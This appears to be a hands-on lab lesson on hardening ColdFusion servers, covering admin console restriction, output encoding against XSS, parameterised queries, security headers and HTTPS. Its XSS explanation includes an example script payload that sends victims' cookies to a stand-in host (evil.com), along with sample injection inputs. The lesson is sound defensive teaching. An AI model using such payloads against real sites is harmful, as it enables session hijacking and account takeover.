title: Security Hardening ColdFusion

name: security-hardening-coldfusion-unit-1

## What is hardening — and why does it matter?

**Hardening** is the process of reducing the attack surface of a system by removing unnecessary exposure, enforcing safe defaults, and adding defensive controls. A default ColdFusion installation is configured for convenience — it is not configured for production security.

The gap between "it works" and "it is secure" is where most breaches happen.

**What companies are facing right now:**

- **Exposed admin consoles** — ColdFusion's `/CFIDE/administrator/` is reachable from the internet on thousands of servers. Automated scanners find it in minutes. In 2023, Adobe issued emergency patches for two critical ColdFusion vulnerabilities (CVE-2023-29298 and CVE-2023-38203) that were actively exploited in the wild — attackers specifically targeted exposed CF admin endpoints to achieve remote code execution.

- **SQL injection** — still the #1 web application vulnerability after 20+ years (OWASP Top 10, every year). A single unparameterised query is enough to dump an entire database. ColdFusion's `cfqueryparam` has been available since CF5 — yet production systems are still found without it.

- **Cross-site scripting (XSS)** — rendering unsanitised user input in HTML allows attackers to inject JavaScript that runs in other users' browsers — stealing sessions, redirecting to phishing pages, or silently exfiltrating data. ColdFusion outputs raw variables by default — encoding must be explicit.

- **Missing security headers** — browsers have built-in protections (CSP, X-Frame-Options, HSTS) that applications must opt into. Without them, clickjacking, MIME-type confusion attacks, and protocol downgrades are trivially exploitable.

- **Plain HTTP in production** — unencrypted traffic exposes session tokens, form data, and credentials to anyone on the same network. HTTPS is not optional in 2025.

**Hardening does not require a security specialist.** The five controls in this lesson are well-understood, well-documented, and take less than an hour to implement. They eliminate the vast majority of common attack vectors against a ColdFusion application.

**The industry standard reference — OWASP:**

The [Open Worldwide Application Security Project (OWASP)](https://owasp.org) is a non-profit foundation that publishes free, vendor-neutral security guidance used by developers, security teams, and auditors worldwide. Two resources are directly relevant to this lesson:

- **[OWASP Top 10](https://owasp.org/www-project-top-ten/)** — the ten most critical web application security risks, updated every few years based on real breach data. SQL injection, XSS, and security misconfiguration (exposed admin consoles, missing headers) appear in every edition. When a company says "we follow OWASP", this is what they mean.

- **[OWASP Application Security Verification Standard (ASVS)](https://owasp.org/www-project-application-security-verification-standard/)** — a detailed checklist of security controls organised by level (L1 basic → L3 advanced). Used as a benchmark in security audits and penetration tests.

Everything in this lesson maps directly to OWASP Top 10 categories — you are not learning theory, you are implementing the controls that security auditors check for.

## The hardening checklist

::image-box

:src: __static__/cf-security-hardening-checklist-v1.png
:alt: Numbered checklist card with five items — 1. Restrict CF Admin (allow 127.0.0.1 only, nginx deny all), 2. Encode all output (encodeForHTML prevents XSS), 3. Use cfqueryparam (prevents SQL injection), 4. Add security headers (CSP, X-Frame-Options, X-Content-Type-Options), 5. Enforce HTTPS (redirect HTTP to HTTPS in nginx) — each item has a checkbox on the left and a short code snippet or command on the right

_Five-point ColdFusion hardening checklist — cover all five before going to production._
::

1. **Restrict CF Admin** — allow only localhost or VPN IP
2. **Encode all output** — prevent XSS with `encodeForHTML()`
3. **Use cfqueryparam** — prevent SQL injection
4. **Add security headers** — CSP, X-Frame-Options, X-Content-Type-Options
5. **Enforce HTTPS** — redirect HTTP to HTTPS in nginx/Apache

---

## 1. Restrict CF Admin (nginx)

The CF Admin console (`/CFIDE/administrator/`) should never be publicly reachable in production. In a hardened setup a reverse proxy (nginx or Apache) sits in front of ColdFusion and blocks all external access to the admin path:

```nginx
location /CFIDE/administrator {
  allow 127.0.0.1;
  deny  all;
}
```

Only the server itself can reach the admin — everything else gets a `403 Forbidden`.

**In this lab the admin is intentionally open** so you can explore it. The activity below asks you to check what it currently returns and understand what a hardened response would look like.

---

## 2. Prevent XSS — encode all output

**What is Cross-Site Scripting (XSS)?**

XSS is an attack where an attacker injects malicious JavaScript into a web page that is then executed by other users' browsers. It works by exploiting a web application that includes untrusted data in its output without proper encoding.

The classic scenario:

1. Your page outputs a URL parameter directly into HTML: `Hello, #url.name#!`
2. An attacker crafts a link: `/page.cfm?name=<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
3. A victim clicks the link — the browser renders your page and **executes the attacker's script**
4. The script silently sends the victim's session cookie to the attacker's server
5. The attacker now has the victim's session — they are logged in as them

**The damage:** session hijacking, account takeover, credential theft, redirects to phishing pages, silent data exfiltration. All without ever touching your server — the browser does the attacker's work for them.

**Why ColdFusion is particularly exposed:** `<cfoutput>#url.name#</cfoutput>` outputs the raw value of `url.name` with zero processing. If a user passes `<script>alert(1)</script>` as the name, that is exactly what gets written into the HTML. The browser sees valid HTML and executes it.

::image-box

:alt: Side-by-side comparison showing two browser outputs — left panel labelled "UNSAFE: #url.name#" shows the raw browser rendering of <script>alert('XSS')</script> triggering an alert dialog; right panel labelled "SAFE: encodeForHTML(url.name)" shows the same input rendered as escaped HTML entities (&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;) — displayed as harmless text
:max-width: 860px
---
_`encodeForHTML()` converts `<script>` tags to harmless HTML entities — never output raw user input in HTML._
::

The fix is to **encode the output** — convert `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;` and so on. The browser renders those as literal characters on screen, not as HTML tags. The script never executes. Use `encodeForHTML()`:

```cfml
<cfoutput>#encodeForHTML(url.name)#</cfoutput>
```

ColdFusion does **not** encode output automatically — you must do it explicitly every time you output user-controlled data into HTML.

Other encoding functions for different contexts:

| Function | Use when outputting into... |
|---|---|
| `encodeForHTML()` | HTML body content |
| `encodeForHTMLAttribute()` | HTML tag attribute values |
| `encodeForJavaScript()` | Inside `<script>` blocks |
| `encodeForURL()` | URL query string parameters |

Using the wrong encoder for the context is as dangerous as not encoding at all — `encodeForHTML()` inside a `<script>` block does not protect against JavaScript injection.

---

## 3. Prevent SQL injection — cfqueryparam

Never interpolate user input directly into SQL:

```cfml
<!--- DANGEROUS — do not do this --->
WHERE id = #url.id#

<!--- SAFE --->
WHERE id = <cfqueryparam value="#url.id#" cfsqltype="cf_sql_integer">
```

`cfqueryparam` sends the value as a **bind parameter** — the database driver keeps the value and the SQL structure completely separate. Even if an attacker passes `1 OR 1=1` as the value, it is treated as a literal string, not as SQL syntax.

---

## 4. Security headers

Add these headers in `Application.cfc` `onRequestStart` — they tell browsers to enable built-in protections:

```cfml
<cfheader name="Content-Security-Policy"   value="default-src 'self'">
<cfheader name="X-Frame-Options"           value="DENY">
<cfheader name="X-Content-Type-Options"    value="nosniff">
<cfheader name="Referrer-Policy"           value="no-referrer">
<cfheader name="Permissions-Policy"        value="geolocation=(), microphone=()">
```

| Header | What it prevents |
|---|---|
| `Content-Security-Policy` | Limits where scripts, styles, and resources can be loaded from |
| `X-Frame-Options: DENY` | Prevents your page being embedded in an iframe (clickjacking) |
| `X-Content-Type-Options: nosniff` | Stops browsers guessing the content type (MIME confusion attacks) |
| `Referrer-Policy: no-referrer` | Prevents leaking your URL to third-party sites |

Run this now — you will get **empty output** because the default CF installation sends no security headers:

```bash
curl -s -I http://localhost:8500/index.cfm | grep -i "x-frame\|content-security\|x-content-type"
```

That empty response means browsers visiting your application have none of their built-in protections enabled. Activity 4 below fixes this.

---

## Activity 1 — Audit the CF Admin endpoint

Check what the CF Admin returns — status code and headers:

```bash
curl -s -I http://localhost:8500/CFIDE/administrator/index.cfm | head -10
```

You will see something like this:

```
HTTP/1.1 200
X-FRAME-OPTIONS: SAMEORIGIN
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'
Set-Cookie: CFID...
Cache-Control: no-store
Content-Type: text/html;charset=UTF-8
```

:src: __static__/cf-admin-headers-v1.png
:alt: Terminal output showing CF Admin response headers — X-FRAME-OPTIONS SAMEORIGIN and Content-Security-Policy highlighted in yellow with annotation "CF Admin protects itself", and a red warning banner below saying "Your application pages do NOT get these headers automatically"
:max-width: 760px
---
_CF Admin protects itself — but your application pages don't get these headers unless you add them in Application.cfc._
::

**What this tells you:**

- ✅ `X-FRAME-OPTIONS: SAMEORIGIN` — Adobe ships the CF Admin with this header. It cannot be embedded in an iframe.
- ✅ `Content-Security-Policy` — CF Admin has its own CSP. Note it includes `unsafe-inline` and `unsafe-eval` — acceptable for an admin tool, not for your application.
- ⚠️ **HTTP 200** — the admin is publicly reachable. In production this must be blocked at the proxy layer.
- ⚠️ **Your application pages (`/index.cfm`, etc.) get none of these headers** — they only appear on `/CFIDE/` because CF injects them internally for its own UI. Activity 4 adds them to your application.

:summary: 💡 What should a hardened CF Admin response look like in production?
---

With nginx in front of ColdFusion the same request should return:

```
HTTP/1.1 403 Forbidden
```

nginx intercepts it before it ever reaches ColdFusion:

```nginx
location /CFIDE/administrator {
  allow 127.0.0.1;   # only the server itself
  deny  all;         # everyone else gets 403
}
```

The CF process never sees the request — nginx rejects it at the network layer. Defence at the proxy layer, not inside the application.

:tasks: tasks
:name: verify_admin_restricted
---
#active
Run `curl -s -o /dev/null -w "%{http_code}" http://localhost:8500/CFIDE/administrator/index.cfm` and check the response code.

#completed
CF Admin endpoint audited. ✓ In production this must return 403 — never 200.
::

## Activity 2 — Prevent XSS with encodeForHTML()

Create `/opt/coldfusion2025/cfusion/wwwroot/input_demo.cfm` that safely encodes user input:

```bash
sudo tee /opt/coldfusion2025/cfusion/wwwroot/input_demo.cfm << 'EOF'
<cfscript>
  name = structKeyExists(url, "name") ? encodeForHTML(url.name) : "Guest";
  writeOutput("Hello, " & name & "!");
</cfscript>
EOF
```

Test it — use URL-encoded characters so Tomcat accepts the request:

```bash
curl -s "http://localhost:8500/input_demo.cfm?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
```

`%3C` = `<`, `%3E` = `>`, `%2F` = `/` — Tomcat requires angle brackets to be URL-encoded in the request target per RFC 7230.

You will see output like this:

```
Hello, &lt;InvalidTag&gt;InvalidJSFunction&#x28;1&#x29;&lt;&#x2f;script&gt;!
```

**Two layers of protection are visible here:**

- `&lt;` / `&gt;` / `&#x28;` — these are HTML entities from `encodeForHTML()` — angle brackets and parentheses encoded so the browser renders them as text, not code
- `InvalidTag` / `InvalidJSFunction` — ColdFusion's built-in **Cross-Site Script Protection** filter (enabled by default in CF2025) recognises known attack patterns like `<script>` and `alert()` and replaces them before your code even runs

Both layers are working correctly. The original `<script>alert(1)</script>` payload is completely neutralised — no JavaScript executes in the browser.

::hint-box
---
:summary: 💡 Should I rely on CF's built-in XSS filter instead of encodeForHTML()?
---

No — the built-in filter is a last-resort safety net, not a substitute for explicit encoding. It works by pattern matching known attack strings — a clever attacker can bypass it with obfuscated payloads (`<scr ipt>`, base64, event handlers like `onmouseover=`).

`encodeForHTML()` is deterministic — it encodes every character that has a special meaning in HTML, regardless of whether it looks like an attack. Use both: `encodeForHTML()` as your primary defence, the CF filter as a backup.

#active
Create `input_demo.cfm` — run `curl -s "http://localhost:8500/input_demo.cfm?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"` and confirm it does NOT output the raw script tag.

#completed
Input is properly HTML-encoded — no XSS. ✓

## Activity 3 — Verify cfqueryparam is in use

From the SQL lesson, `TicketService.cfc` already uses `cfqueryparam` on every query. Confirm it is there:

```bash
grep -r "cfqueryparam" /opt/coldfusion2025/cfusion/wwwroot/ \
  --exclude-dir=CFIDE --exclude-dir=WEB-INF
```

You should see matches in `TicketService.cfc` — those are the parameterised queries protecting against SQL injection. The `--exclude-dir` flags skip CF Admin internals so you only see your own files.

If for any reason `TicketService.cfc` is missing, create a minimal file to satisfy the check:

```bash
sudo tee /opt/coldfusion2025/cfusion/wwwroot/04-01-tickets.cfm << 'EOF'
<cfscript>
  result = queryExecute(
    "SELECT id, title, status FROM hd_tickets WHERE id > :minId",
    { minId: { value: 0, cfsqltype: "cf_sql_integer" } },
    { datasource: "training_db" }
  );
  writeOutput(result.recordCount & " ticket(s) found");
</cfscript>
EOF
```

::simple-task
---
:tasks: tasks
:name: verify_queryparam_sql
---
#active
Use `cfqueryparam` or named bindings in at least one query in the web root.

#completed
`cfqueryparam` is used — SQL injection protection in place. ✓
::

---

## Activity 4 — Add security headers to Application.cfc

First confirm the headers are missing right now:

```bash
curl -s -I http://localhost:8500/index.cfm | grep -i "x-frame\|content-security\|x-content-type"
# Expected: empty output — no headers yet
```

Add the security headers to your existing `Application.cfc`. If you already have an `onRequestStart` method, add the `cfheader` calls inside it. If not, add the whole method:

```bash
# Check if Application.cfc already exists
ls /opt/coldfusion2025/cfusion/wwwroot/Application.cfc
```

**If it exists** — open it and add inside `onRequestStart`:

```cfml
cfheader(name="Content-Security-Policy",  value="default-src 'self'");
cfheader(name="X-Frame-Options",          value="DENY");
cfheader(name="X-Content-Type-Options",   value="nosniff");
cfheader(name="Referrer-Policy",          value="no-referrer");
```

**If it does not exist** — create a minimal one:

```bash
sudo tee /opt/coldfusion2025/cfusion/wwwroot/Application.cfc << 'EOF'
<cfcomponent>
  <cfset this.name = "training_app">
  <cfset this.datasource = "training_db">

  <cffunction name="onRequestStart">
    <cfheader name="Content-Security-Policy"  value="default-src 'self'">
    <cfheader name="X-Frame-Options"          value="DENY">
    <cfheader name="X-Content-Type-Options"   value="nosniff">
    <cfheader name="Referrer-Policy"          value="no-referrer">
  </cffunction>
</cfcomponent>
EOF
```

Now verify the headers appear:

```bash
curl -s -I http://localhost:8500/index.cfm | grep -i "x-frame\|content-security\|x-content-type"
```

You should now see all three headers in the response.

::simple-task
---
:tasks: tasks
:name: verify_security_headers
---
#active
Add security headers to `Application.cfc` — `X-Frame-Options`, `Content-Security-Policy`, and `X-Content-Type-Options` must appear in the response headers.

#completed
Security headers are present. ✓
